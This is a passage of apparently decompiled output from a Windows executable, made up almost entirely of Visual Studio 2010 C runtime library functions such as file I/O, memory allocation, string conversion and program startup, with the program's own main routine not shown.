        iVar2 = __flsbuf((int)*_DstBuf,_File);
        if (iVar2 == -1) goto LAB_00405fca;
        _DstBuf = (void *)((int)_DstBuf + 1);
        local_c = _File->_bufsiz;
        uVar5 = uVar5 - 1;
        if ((int)local_c < 1) {
          local_c = 1;
        }
      } while( true );
    }
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004071df();
  }
  return 0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fwrite
// 
// Library: Visual Studio 2010 Release

size_t __cdecl _fwrite(void *_Str,size_t _Size,size_t _Count,FILE *_File)

{
  int *piVar1;
  size_t sVar2;
  
  if ((_Size != 0) && (_Count != 0)) {
    if (_File != (FILE *)0x0) {
      __lock_file(_File);
      sVar2 = __fwrite_nolock(_Str,_Size,_Count,_File);
      FUN_0040604f();
      return sVar2;
    }
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004071df();
  }
  return 0;
}



void FUN_0040604f(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 0x14));
  return;
}



// Library Function - Single Match
//  _fast_error_exit
// 
// Library: Visual Studio 2010 Release

void __cdecl _fast_error_exit(int param_1)

{
  if (DAT_00416f48 == 1) {
    __FF_MSGBANNER();
  }
  __NMSG_WRITE(param_1);
  ___crtExitProcess(0xff);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Removing unreachable block (ram,0x004060bb)
// Library Function - Single Match
//  ___tmainCRTStartup
// 
// Library: Visual Studio 2010 Release

int ___tmainCRTStartup(void)

{
  int iVar1;
  _STARTUPINFOW local_6c;
  int local_24;
  int local_20;
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_00414c20;
  uStack_c = 0x40608e;
  GetStartupInfoW(&local_6c);
  if (DAT_00419fc8 == 0) {
    HeapSetInformation((HANDLE)0x0,HeapEnableTerminationOnCorruption,(PVOID)0x0,0);
  }
  local_20 = 0;
  iVar1 = __heap_init();
  if (iVar1 == 0) {
    _fast_error_exit(0x1c);
  }
  iVar1 = __mtinit();
  if (iVar1 == 0) {
    _fast_error_exit(0x10);
  }
  __RTC_Initialize();
  local_8 = (undefined *)0x0;
  iVar1 = __ioinit();
  if (iVar1 < 0) {
    __amsg_exit(0x1b);
  }
  DAT_00419fc4 = GetCommandLineW();
  DAT_00416f44 = ___crtGetEnvironmentStringsW();
  iVar1 = __wsetargv();
  if (iVar1 < 0) {
    __amsg_exit(8);
  }
  iVar1 = __wsetenvp();
  if (iVar1 < 0) {
    __amsg_exit(9);
  }
  iVar1 = __cinit(1);
  if (iVar1 != 0) {
    __amsg_exit(iVar1);
  }
  __wwincmdln();
  local_24 = FUN_00401000((HINSTANCE)&IMAGE_DOS_HEADER_00400000);
  if (local_20 == 0) {
                    // WARNING: Subroutine does not return
    _exit(local_24);
  }
  __cexit();
  return local_24;
}



void entry(void)

{
  ___security_init_cookie();
  ___tmainCRTStartup();
  return;
}



// Library Function - Single Match
//  _wcsrchr
// 
// Library: Visual Studio 2010 Release

wchar_t * __cdecl _wcsrchr(wchar_t *_Str,wchar_t _Ch)

{
  wchar_t wVar1;
  wchar_t *pwVar2;
  
  pwVar2 = _Str;
  do {
    wVar1 = *pwVar2;
    pwVar2 = pwVar2 + 1;
  } while (wVar1 != L'\0');
  do {
    pwVar2 = pwVar2 + -1;
    if (pwVar2 == _Str) break;
  } while (*pwVar2 != _Ch);
  if (*pwVar2 != _Ch) {
    pwVar2 = (wchar_t *)0x0;
  }
  return pwVar2;
}



// Library Function - Single Match
//  _wcsstr
// 
// Library: Visual Studio 2010 Release

wchar_t * __cdecl _wcsstr(wchar_t *_Str,wchar_t *_SubStr)

{
  wchar_t wVar1;
  wchar_t *pwVar2;
  int iVar3;
  
  if (*_SubStr != L'\0') {
    wVar1 = *_Str;
    if (wVar1 != L'\0') {
      iVar3 = (int)_Str - (int)_SubStr;
      pwVar2 = _SubStr;
joined_r0x0040624e:
      do {
        if (wVar1 != L'\0') {
          if (*pwVar2 == L'\0') {
            return _Str;
          }
          if (*(wchar_t *)(iVar3 + (int)pwVar2) == *pwVar2) {
            wVar1 = *(wchar_t *)(iVar3 + (int)(pwVar2 + 1));
            pwVar2 = pwVar2 + 1;
            goto joined_r0x0040624e;
          }
        }
        if (*pwVar2 == L'\0') {
          return _Str;
        }
        _Str = _Str + 1;
        wVar1 = *_Str;
        iVar3 = iVar3 + 2;
        pwVar2 = _SubStr;
      } while (wVar1 != L'\0');
    }
    _Str = (wchar_t *)0x0;
  }
  return _Str;
}



// Library Function - Single Match
//  _wcsncpy
// 
// Libraries: Visual Studio 2010 Release, Visual Studio 2012 Release, Visual Studio 2019 Release

wchar_t * __cdecl _wcsncpy(wchar_t *_Dest,wchar_t *_Source,size_t _Count)

{
  short sVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  if (_Count != 0) {
    puVar4 = (undefined4 *)_Dest;
    do {
      sVar1 = *(short *)(((int)_Source - (int)_Dest) + (int)puVar4);
      *(short *)puVar4 = sVar1;
      puVar4 = (undefined4 *)((int)puVar4 + 2);
      if (sVar1 == 0) break;
      _Count = _Count - 1;
    } while (_Count != 0);
    if ((_Count != 0) && (uVar2 = _Count - 1, uVar2 != 0)) {
      for (uVar3 = uVar2 >> 1; uVar3 != 0; uVar3 = uVar3 - 1) {
        *puVar4 = 0;
        puVar4 = puVar4 + 1;
      }
      for (uVar2 = (uint)((uVar2 & 1) != 0); uVar2 != 0; uVar2 = uVar2 - 1) {
        *(undefined2 *)puVar4 = 0;
        puVar4 = (undefined4 *)((int)puVar4 + 2);
      }
    }
  }
  return _Dest;
}



// Library Function - Single Match
//  _strrchr
// 
// Library: Visual Studio

char * __cdecl _strrchr(char *_Str,int _Ch)

{
  char cVar1;
  int iVar2;
  char *pcVar3;
  char *pcVar4;
  
  iVar2 = -1;
  do {
    pcVar4 = _Str;
    if (iVar2 == 0) break;
    iVar2 = iVar2 + -1;
    pcVar4 = _Str + 1;
    cVar1 = *_Str;
    _Str = pcVar4;
  } while (cVar1 != '\0');
  iVar2 = -(iVar2 + 1);
  pcVar4 = pcVar4 + -1;
  do {
    pcVar3 = pcVar4;
    if (iVar2 == 0) break;
    iVar2 = iVar2 + -1;
    pcVar3 = pcVar4 + -1;
    cVar1 = *pcVar4;
    pcVar4 = pcVar3;
  } while ((char)_Ch != cVar1);
  pcVar3 = pcVar3 + 1;
  if (*pcVar3 != (char)_Ch) {
    pcVar3 = (char *)0x0;
  }
  return pcVar3;
}



// Library Function - Single Match
//  _malloc
// 
// Library: Visual Studio 2010 Release

void * __cdecl _malloc(size_t _Size)

{
  SIZE_T dwBytes;
  LPVOID pvVar1;
  int iVar2;
  int *piVar3;
  
  if (_Size < 0xffffffe1) {
    do {
      if (DAT_00417b04 == (HANDLE)0x0) {
        __FF_MSGBANNER();
        __NMSG_WRITE(0x1e);
        ___crtExitProcess(0xff);
      }
      dwBytes = _Size;
      if (_Size == 0) {
        dwBytes = 1;
      }
      pvVar1 = HeapAlloc(DAT_00417b04,0,dwBytes);
      if (pvVar1 != (LPVOID)0x0) {
        return pvVar1;
      }
      if (DAT_00417b0c == 0) {
        piVar3 = __errno();
        *piVar3 = 0xc;
        break;
      }
      iVar2 = __callnewh(_Size);
    } while (iVar2 != 0);
    piVar3 = __errno();
    *piVar3 = 0xc;
  }
  else {
    __callnewh(_Size);
    piVar3 = __errno();
    *piVar3 = 0xc;
  }
  return (void *)0x0;
}



// Library Function - Single Match
//  _free
// 
// Library: Visual Studio 2010 Release

void __cdecl _free(void *_Memory)

{
  BOOL BVar1;
  int *piVar2;
  DWORD DVar3;
  int iVar4;
  
  if (_Memory != (void *)0x0) {
    BVar1 = HeapFree(DAT_00417b04,0,_Memory);
    if (BVar1 == 0) {
      piVar2 = __errno();
      DVar3 = GetLastError();
      iVar4 = __get_errno_from_oserr(DVar3);
      *piVar2 = iVar4;
    }
  }
  return;
}



// Library Function - Single Match
//  __fseek_nolock
// 
// Library: Visual Studio 2010 Release

int __cdecl __fseek_nolock(FILE *_File,long _Offset,int _Origin)

{
  uint uVar1;
  int *piVar2;
  int iVar3;
  long lVar4;
  
  if ((_File->_flag & 0x83U) == 0) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    iVar3 = -1;
  }
  else {
    _File->_flag = _File->_flag & 0xffffffef;
    if (_Origin == 1) {
      lVar4 = __ftell_nolock(_File);
      _Offset = _Offset + lVar4;
      _Origin = 0;
    }
    __flush(_File);
    uVar1 = _File->_flag;
    if ((char)uVar1 < '\0') {
      _File->_flag = uVar1 & 0xfffffffc;
    }
    else if ((((uVar1 & 1) != 0) && ((uVar1 & 8) != 0)) && ((uVar1 & 0x400) == 0)) {
      _File->_bufsiz = 0x200;
    }
    iVar3 = __fileno(_File);
    lVar4 = __lseek(iVar3,_Offset,_Origin);
    iVar3 = (lVar4 != -1) - 1;
  }
  return iVar3;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fseek
// 
// Library: Visual Studio 2010 Release

int __cdecl _fseek(FILE *_File,long _Offset,int _Origin)

{
  int *piVar1;
  int iVar2;
  
  if ((_File == (FILE *)0x0) || (((_Origin != 0 && (_Origin != 1)) && (_Origin != 2)))) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004071df();
    iVar2 = -1;
  }
  else {
    __lock_file(_File);
    iVar2 = __fseek_nolock(_File,_Offset,_Origin);
    FUN_004064d7();
  }
  return iVar2;
}



void FUN_004064d7(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __ftell_nolock
// 
// Library: Visual Studio 2010 Release

long __cdecl __ftell_nolock(FILE *_File)

{
  uint uVar1;
  char *pcVar2;
  int *piVar3;
  uint _FileHandle;
  FILE *pFVar4;
  char *pcVar5;
  FILE *pFVar6;
  long lVar7;
  char *pcVar8;
  int iVar9;
  bool bVar10;
  int local_10;
  int local_8;
  
  pFVar6 = _File;
  if (_File == (FILE *)0x0) {
    piVar3 = __errno();
    *piVar3 = 0x16;
    FUN_004071df();
    return -1;
  }
  _FileHandle = __fileno(_File);
  if (_File->_cnt < 0) {
    _File->_cnt = 0;
  }
  local_8 = __lseek(_FileHandle,0,1);
  if (local_8 < 0) {
LAB_00406633:
    lVar7 = -1;
  }
  else {
    uVar1 = _File->_flag;
    if ((uVar1 & 0x108) == 0) {
      return local_8 - _File->_cnt;
    }
    pcVar5 = _File->_ptr;
    pcVar8 = _File->_base;
    local_10 = (int)pcVar5 - (int)pcVar8;
    if ((uVar1 & 3) == 0) {
      if (-1 < (char)uVar1) {
        piVar3 = __errno();
        *piVar3 = 0x16;
        goto LAB_00406633;
      }
    }
    else {
      pcVar2 = pcVar8;
      if ((*(byte *)((&DAT_00418ea0)[(int)_FileHandle >> 5] + 4 + (_FileHandle & 0x1f) * 0x40) &
          0x80) != 0) {
        for (; pcVar2 < pcVar5; pcVar2 = pcVar2 + 1) {
          if (*pcVar2 == '\n') {
            local_10 = local_10 + 1;
          }
        }
      }
    }
    if (local_8 == 0) {
      return local_10;
    }
    if ((*(byte *)&_File->_flag & 1) != 0) {
      if (_File->_cnt == 0) {
        local_10 = 0;
      }
      else {
        pFVar4 = (FILE *)(pcVar5 + (_File->_cnt - (int)pcVar8));
        iVar9 = (_FileHandle & 0x1f) * 0x40;
        if ((*(byte *)((&DAT_00418ea0)[(int)_FileHandle >> 5] + 4 + iVar9) & 0x80) != 0) {
          lVar7 = __lseek(_FileHandle,0,2);
          if (lVar7 == local_8) {
            pcVar5 = _File->_base;
            pcVar8 = pcVar5 + (int)&pFVar4->_ptr;
            _File = pFVar4;
            for (; pcVar5 < pcVar8; pcVar5 = pcVar5 + 1) {
              if (*pcVar5 == '\n') {
                _File = (FILE *)((int)&_File->_ptr + 1);
              }
            }
            bVar10 = (pFVar6->_flag & 0x2000U) == 0;
          }
          else {
            lVar7 = __lseek(_FileHandle,local_8,0);
            if (lVar7 < 0) goto LAB_00406633;
            pFVar6 = (FILE *)0x200;
            if ((((FILE *)0x200 < pFVar4) || ((_File->_flag & 8U) == 0)) ||
               ((_File->_flag & 0x400U) != 0)) {
              pFVar6 = (FILE *)_File->_bufsiz;
            }
            bVar10 = (*(byte *)((&DAT_00418ea0)[(int)_FileHandle >> 5] + 4 + iVar9) & 4) == 0;
            _File = pFVar6;
          }
          pFVar4 = _File;
          if (!bVar10) {
            pFVar4 = (FILE *)((int)&_File->_ptr + 1);
          }
        }
        _File = pFVar4;
        local_8 = local_8 - (int)_File;
      }
    }
    lVar7 = local_10 + local_8;
  }
  return lVar7;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _ftell
// 
// Library: Visual Studio 2010 Release

long __cdecl _ftell(FILE *_File)

{
  int *piVar1;
  long lVar2;
  
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004071df();
    lVar2 = -1;
  }
  else {
    __lock_file(_File);
    lVar2 = __ftell_nolock(_File);
    FUN_004066d0();
  }
  return lVar2;
}



void FUN_004066d0(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 8));
  return;
}



void __cdecl FUN_004066da(ulong param_1)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  p_Var1->_holdrand = param_1;
  return;
}



uint FUN_004066ec(void)

{
  _ptiddata p_Var1;
  uint uVar2;
  
  p_Var1 = __getptd();
  uVar2 = p_Var1->_holdrand * 0x343fd + 0x269ec3;
  p_Var1->_holdrand = uVar2;
  return uVar2 >> 0x10 & 0x7fff;
}



// Library Function - Single Match
//  _strcpy_s
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl _strcpy_s(char *_Dst,rsize_t _SizeInBytes,char *_Src)

{
  char cVar1;
  int *piVar2;
  int iVar3;
  errno_t eStack_10;
  
  if ((_Dst != (char *)0x0) && (_SizeInBytes != 0)) {
    if (_Src != (char *)0x0) {
      iVar3 = (int)_Dst - (int)_Src;
      do {
        cVar1 = *_Src;
        _Src[iVar3] = cVar1;
        _Src = _Src + 1;
        if (cVar1 == '\0') break;
        _SizeInBytes = _SizeInBytes - 1;
      } while (_SizeInBytes != 0);
      if (_SizeInBytes != 0) {
        return 0;
      }
      *_Dst = '\0';
      piVar2 = __errno();
      eStack_10 = 0x22;
      *piVar2 = 0x22;
      goto LAB_0040672c;
    }
    *_Dst = '\0';
  }
  piVar2 = __errno();
  eStack_10 = 0x16;
  *piVar2 = 0x16;
LAB_0040672c:
  FUN_004071df();
  return eStack_10;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __fsopen
// 
// Library: Visual Studio 2010 Release

FILE * __cdecl __fsopen(char *_Filename,char *_Mode,int _ShFlag)

{
  int *piVar1;
  FILE *pFVar2;
  undefined local_14 [8];
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_00414c80;
  uStack_c = 0x406778;
  if (((_Filename == (char *)0x0) || (_Mode == (char *)0x0)) || (*_Mode == '\0')) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004071df();
  }
  else {
    pFVar2 = __getstream();
    if (pFVar2 == (FILE *)0x0) {
      piVar1 = __errno();
      *piVar1 = 0x18;
    }
    else {
      local_8 = (undefined *)0x0;
      if (*_Filename != '\0') {
        pFVar2 = __openfile(_Filename,_Mode,_ShFlag,pFVar2);
        local_8 = (undefined *)0xfffffffe;
        FUN_0040681e();
        return pFVar2;
      }
      piVar1 = __errno();
      *piVar1 = 0x16;
      __local_unwind4(&DAT_00416048,(int)local_14,0xfffffffe);
    }
  }
  return (FILE *)0x0;
}



void FUN_0040681e(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  _fopen
// 
// Library: Visual Studio 2010 Release

FILE * __cdecl _fopen(char *_Filename,char *_Mode)

{
  FILE *pFVar1;
  
  pFVar1 = __fsopen(_Filename,_Mode,0x40);
  return pFVar1;
}



undefined4 * __thiscall FUN_0040684a(void *this,byte param_1)

{
  *(undefined ***)this = &PTR_FUN_00412250;
  FUN_0040b696((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FUN_00406c67(this);
  }
  return (undefined4 *)this;
}



undefined4 * __thiscall FUN_00406871(void *this,exception *param_1)

{
  std::exception::exception((exception *)this,param_1);
  *(undefined ***)this = &PTR_FUN_00412250;
  return (undefined4 *)this;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  void * __cdecl operator new(unsigned int)
// 
// Library: Visual Studio 2010 Release

void * __cdecl operator_new(uint param_1)

{
  code *pcVar1;
  int iVar2;
  void *pvVar3;
  undefined **local_14 [3];
  char *local_8;
  
  do {
    pvVar3 = _malloc(param_1);
    if (pvVar3 != (void *)0x0) {
      return pvVar3;
    }
    iVar2 = __callnewh(param_1);
  } while (iVar2 != 0);
  if ((_DAT_00416f58 & 1) == 0) {
    _DAT_00416f58 = _DAT_00416f58 | 1;
    local_8 = s_bad_allocation_00412258;
    std::exception::exception((exception *)&DAT_00416f4c,&local_8,1);
    _DAT_00416f4c = &PTR_FUN_00412250;
    _atexit((_func_4879 *)&LAB_0041164a);
  }
  std::exception::exception((exception *)local_14,(exception *)&DAT_00416f4c);
  local_14[0] = &PTR_FUN_00412250;
  __CxxThrowException_8(local_14,&DAT_00414c9c);
  pcVar1 = (code *)swi(3);
  pvVar3 = (void *)(*pcVar1)();
  return pvVar3;
}



// Library Function - Single Match
//  public: __thiscall _LocaleUpdate::_LocaleUpdate(struct localeinfo_struct *)
// 
// Library: Visual Studio 2010 Release

_LocaleUpdate * __thiscall
_LocaleUpdate::_LocaleUpdate(_LocaleUpdate *this,localeinfo_struct *param_1)

{
  uint *puVar1;
  _ptiddata p_Var2;
  pthreadlocinfo ptVar3;
  pthreadmbcinfo ptVar4;
  
  this[0xc] = (_LocaleUpdate)0x0;
  if (param_1 == (localeinfo_struct *)0x0) {
    p_Var2 = __getptd();
    *(_ptiddata *)(this + 8) = p_Var2;
    *(pthreadlocinfo *)this = p_Var2->ptlocinfo;
    *(pthreadmbcinfo *)(this + 4) = p_Var2->ptmbcinfo;
    if ((*(undefined **)this != PTR_DAT_00416d08) && ((p_Var2->_ownlocale & DAT_00416ac0) == 0)) {
      ptVar3 = ___updatetlocinfo();
      *(pthreadlocinfo *)this = ptVar3;
    }
    if ((*(undefined **)(this + 4) != PTR_DAT_004169c8) &&
       ((*(uint *)(*(int *)(this + 8) + 0x70) & DAT_00416ac0) == 0)) {
      ptVar4 = ___updatetmbcinfo();
      *(pthreadmbcinfo *)(this + 4) = ptVar4;
    }
    if ((*(byte *)(*(int *)(this + 8) + 0x70) & 2) == 0) {
      puVar1 = (uint *)(*(int *)(this + 8) + 0x70);
      *puVar1 = *puVar1 | 2;
      this[0xc] = (_LocaleUpdate)0x1;
    }
  }
  else {
    *(pthreadlocinfo *)this = param_1->locinfo;
    *(pthreadmbcinfo *)(this + 4) = param_1->mbcinfo;
  }
  return this;
}



// Library Function - Single Match
//  unsigned __int64 __cdecl wcstoxq(struct localeinfo_struct *,wchar_t const *,wchar_t const *
// *,int,int)
// 
// Library: Visual Studio 2010 Release

__uint64 __cdecl
wcstoxq(localeinfo_struct *param_1,wchar_t *param_2,wchar_t **param_3,int param_4,int param_5)

{
  wchar_t _C;
  wchar_t *pwVar1;
  int *piVar2;
  int iVar3;
  uint uVar4;
  uint extraout_ECX;
  uint uVar5;
  wchar_t *pwVar6;
  ushort uVar7;
  _LocaleUpdate local_34 [8];
  int local_2c;
  char local_28;
  uint local_24;
  uint local_20;
  uint local_1c;
  int local_18;
  undefined8 local_14;
  undefined8 local_c;
  
  _LocaleUpdate::_LocaleUpdate(local_34,param_1);
  if (param_3 != (wchar_t **)0x0) {
    *param_3 = param_2;
  }
  if ((param_2 == (wchar_t *)0x0) || ((param_4 != 0 && ((param_4 < 2 || (0x24 < param_4)))))) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    FUN_004071df();
    if (local_28 != '\0') {
      *(uint *)(local_2c + 0x70) = *(uint *)(local_2c + 0x70) & 0xfffffffd;
    }
    local_c._0_4_ = 0;
    local_c._4_4_ = 0;
    goto LAB_00406c39;
  }
  _C = *param_2;
  local_c = 0;
  pwVar1 = param_2;
  while( true ) {
    pwVar6 = pwVar1 + 1;
    iVar3 = _iswctype(_C,8);
    if (iVar3 == 0) break;
    _C = *pwVar6;
    pwVar1 = pwVar6;
  }
  if (_C == L'-') {
    param_5 = param_5 | 2;
LAB_00406a28:
    _C = *pwVar6;
    pwVar6 = pwVar1 + 2;
  }
  else if (_C == L'+') goto LAB_00406a28;
  uVar5 = (uint)(ushort)_C;
  if (((param_4 < 0) || (param_4 == 1)) || (0x24 < param_4)) {
    if (param_3 != (wchar_t **)0x0) {
      *param_3 = param_2;
    }
    if (local_28 != '\0') {
      *(uint *)(local_2c + 0x70) = *(uint *)(local_2c + 0x70) & 0xfffffffd;
    }
    local_c._0_4_ = 0;
    local_c._4_4_ = 0;
LAB_00406c39:
    return CONCAT44(local_c._4_4_,(uint)local_c);
  }
  if (param_4 == 0) {
    iVar3 = __wchartodigit(_C);
    if (iVar3 != 0) {
      param_4 = 10;
      goto LAB_00406aa3;
    }
    if ((*pwVar6 != L'x') && (*pwVar6 != L'X')) {
      param_4 = 8;
      goto LAB_00406aa3;
    }
    param_4 = 0x10;
  }
  if (((param_4 == 0x10) && (iVar3 = __wchartodigit(_C), iVar3 == 0)) &&
     ((*pwVar6 == L'x' || (*pwVar6 == L'X')))) {
    uVar5 = (uint)(ushort)pwVar6[1];
    pwVar6 = pwVar6 + 2;
  }
LAB_00406aa3:
  local_20 = param_4 >> 0x1f;
  local_24 = param_4;
  local_14 = __aulldvrm(0xffffffff,0xffffffff,param_4,local_20);
  local_18 = 0x10;
  local_1c = extraout_ECX;
  do {
    uVar7 = (ushort)uVar5;
    uVar4 = __wchartodigit(uVar7);
    if (uVar4 == 0xffffffff) {
      if (((uVar7 < 0x41) || (0x5a < uVar7)) && (0x19 < (ushort)(uVar7 - 0x61))) break;
      if ((ushort)(uVar7 - 0x61) < 0x1a) {
        uVar5 = uVar5 - 0x20;
      }
      uVar4 = uVar5 - 0x37;
    }
    if ((uint)param_4 <= uVar4) break;
    if (((local_c._4_4_ < local_14._4_4_) ||
        ((local_c._4_4_ <= local_14._4_4_ && ((uint)local_c < (uint)local_14)))) ||
       (((uint)local_c == (uint)local_14 &&
        ((local_c._4_4_ == local_14._4_4_ && ((local_18 != 0 || (uVar4 <= local_1c)))))))) {
      local_c = __allmul(local_24,local_20,(uint)local_c,local_c._4_4_);
      local_c = local_c + (ulonglong)uVar4;
      param_5 = param_5 | 8;
    }
    else {
      param_5 = param_5 | 0xc;
      if (param_3 == (wchar_t **)0x0) break;
    }
    uVar5 = (uint)(ushort)*pwVar6;
    pwVar6 = pwVar6 + 1;
  } while( true );
  pwVar6 = pwVar6 + -1;
  if ((param_5 & 8U) == 0) {
    if (param_3 != (wchar_t **)0x0) {
      pwVar6 = param_2;
    }
    local_c = 0;
  }
  else if (((param_5 & 4U) != 0) ||
          (((param_5 & 1U) == 0 &&
           ((((param_5 & 2U) != 0 &&
             ((0x80000000 < local_c._4_4_ || ((0x7fffffff < local_c._4_4_ && ((uint)local_c != 0))))
             )) || (((param_5 & 2U) == 0 &&
                    ((0x7ffffffe < local_c._4_4_ && (0x7fffffff < local_c._4_4_)))))))))) {
    piVar2 = __errno();
    *piVar2 = 0x22;
    if ((param_5 & 1U) == 0) {
      if ((param_5 & 2U) == 0) {
        local_c = 0x7fffffffffffffff;
      }
      else {
        local_c = -0x8000000000000000;
      }
    }
    else {
      local_c = -1;
    }
  }
  if (param_3 != (wchar_t **)0x0) {
    *param_3 = pwVar6;
  }
  if ((param_5 & 2U) != 0) {
    local_c = CONCAT44(-(local_c._4_4_ + ((uint)local_c != 0)),-(uint)local_c);
  }
  if (local_28 != '\0') {
    *(uint *)(local_2c + 0x70) = *(uint *)(local_2c + 0x70) & 0xfffffffd;
  }
  goto LAB_00406c39;
}



// Library Function - Single Match
//  __wcstoi64
// 
// Library: Visual Studio 2010 Release

longlong __cdecl __wcstoi64(wchar_t *_Str,wchar_t **_EndPtr,int _Radix)

{
  __uint64 _Var1;
  undefined **ppuVar2;
  
  if (DAT_00417b2c == 0) {
    ppuVar2 = &PTR_DAT_00416d0c;
  }
  else {
    ppuVar2 = (undefined **)0x0;
  }
  _Var1 = wcstoxq((localeinfo_struct *)ppuVar2,_Str,_EndPtr,_Radix,0);
  return _Var1;
}



void __cdecl FUN_00406c67(void *param_1)

{
  _free(param_1);
  return;
}



// Library Function - Single Match
//  _memcpy_s
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl _memcpy_s(void *_Dst,rsize_t _DstSize,void *_Src,rsize_t _MaxCount)

{
  errno_t eVar1;
  int *piVar2;
  
  if (_MaxCount == 0) {
LAB_00406c7f:
    eVar1 = 0;
  }
  else {
    if (_Dst == (void *)0x0) {
LAB_00406c89:
      piVar2 = __errno();
      eVar1 = 0x16;
      *piVar2 = 0x16;
    }
    else {
      if ((_Src != (void *)0x0) && (_MaxCount <= _DstSize)) {
        FID_conflict__memcpy(_Dst,_Src,_MaxCount);
        goto LAB_00406c7f;
      }
      _memset(_Dst,0,_DstSize);
      if (_Src == (void *)0x0) goto LAB_00406c89;
      if (_MaxCount <= _DstSize) {
        return 0x16;
      }
      piVar2 = __errno();
      eVar1 = 0x22;
      *piVar2 = 0x22;
    }
    FUN_004071df();
  }
  return eVar1;
}



// Library Function - Single Match
//  _xtow_s@20
// 
// Library: Visual Studio 2010 Release

int __thiscall _xtow_s_20(void *this,uint param_1,uint param_2,int param_3)

{
  short *psVar1;
  uint in_EAX;
  int *piVar2;
  short *psVar3;
  short *psVar4;
  short sVar5;
  uint uVar6;
  int iStack_14;
  
  if (this == (void *)0x0) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    FUN_004071df();
    return 0x16;
  }
  if (param_1 == 0) {
LAB_00406d12:
    piVar2 = __errno();
    iStack_14 = 0x16;
  }
  else {
    *(undefined2 *)this = 0;
    if ((param_3 != 0) + 1 < param_1) {
      if (param_2 - 2 < 0x23) {
        psVar3 = (short *)this;
        if (param_3 != 0) {
          *(undefined2 *)this = 0x2d;
          psVar3 = (short *)((int)this + 2);
          in_EAX = -in_EAX;
        }
        uVar6 = (uint)(param_3 != 0);
        psVar1 = psVar3;
        do {
          psVar4 = psVar1;
          sVar5 = (short)(in_EAX % param_2);
          if (in_EAX % param_2 < 10) {
            sVar5 = sVar5 + 0x30;
          }
          else {
            sVar5 = sVar5 + 0x57;
          }
          *psVar4 = sVar5;
          uVar6 = uVar6 + 1;
        } while ((in_EAX / param_2 != 0) &&
                (in_EAX = in_EAX / param_2, psVar1 = psVar4 + 1, uVar6 < param_1));
        if (uVar6 < param_1) {
          psVar4[1] = 0;
          do {
            sVar5 = *psVar4;
            *psVar4 = *psVar3;
            *psVar3 = sVar5;
            psVar4 = psVar4 + -1;
            psVar3 = psVar3 + 1;
          } while (psVar3 < psVar4);
          return 0;
        }
        *(undefined2 *)this = 0;
        piVar2 = __errno();
        iStack_14 = 0x22;
        *piVar2 = 0x22;
        goto LAB_00406d1c;
      }
      goto LAB_00406d12;
    }
    piVar2 = __errno();
    iStack_14 = 0x22;
  }
  *piVar2 = iStack_14;
LAB_00406d1c:
  FUN_004071df();
  return iStack_14;
}



// Library Function - Single Match
//  __itow_s
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl __itow_s(int _Val,wchar_t *_DstBuf,size_t _SizeInWords,int _Radix)

{
  int iVar1;
  
  if ((_Radix == 10) && (_Val < 0)) {
    iVar1 = 1;
    _Radix = 10;
  }
  else {
    iVar1 = 0;
  }
  iVar1 = _xtow_s_20(_DstBuf,_SizeInWords,_Radix,iVar1);
  return iVar1;
}



// Library Function - Single Match
//  __vsnprintf_helper
// 
// Library: Visual Studio 2010 Release

int __cdecl
__vsnprintf_helper(undefined *param_1,char *param_2,uint param_3,int param_4,undefined4 param_5,
                  undefined4 param_6)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  char **ppcVar4;
  FILE local_24;
  
  local_24._ptr = (char *)0x0;
  ppcVar4 = (char **)&local_24._cnt;
  for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {
    *ppcVar4 = (char *)0x0;
    ppcVar4 = ppcVar4 + 1;
  }
  if (param_4 == 0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004071df();
    iVar3 = -1;
  }
  else if ((param_3 == 0) || (param_2 != (char *)0x0)) {
    local_24._cnt = 0x7fffffff;
    if (param_3 < 0x80000000) {
      local_24._cnt = param_3;
    }
    local_24._flag = 0x42;
    local_24._base = param_2;
    local_24._ptr = param_2;
    iVar3 = (*(code *)param_1)(&local_24,param_4,param_5,param_6);
    if (param_2 != (char *)0x0) {
      if (-1 < iVar3) {
        local_24._cnt = local_24._cnt - 1;
        if (-1 < local_24._cnt) {
          *local_24._ptr = '\0';
          return iVar3;
        }
        iVar2 = __flsbuf(0,&local_24);
        if (iVar2 != -1) {
          return iVar3;
        }
      }
